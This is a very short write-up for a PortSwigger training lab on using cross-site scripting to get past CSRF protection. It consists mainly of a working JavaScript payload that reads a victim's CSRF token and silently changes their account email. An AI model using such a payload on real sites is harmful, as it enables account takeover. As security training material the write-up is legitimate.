+++
date = '2026-06-30T16:20:16+08:00'
draft = false
title = "Exploiting XSS to bypass CSRF defenses | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
In the spirit of [this problem](/training/portswigger/xss/xss_practitioner13), we can simply set up a similar payload as shown here:
```html
<script>
setTimeout(function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('email', 'hijacked@test.com');

    fetch('/my-account/change-email', {
        method: 'POST',
        body: data
    });
}, 100);
</script>
```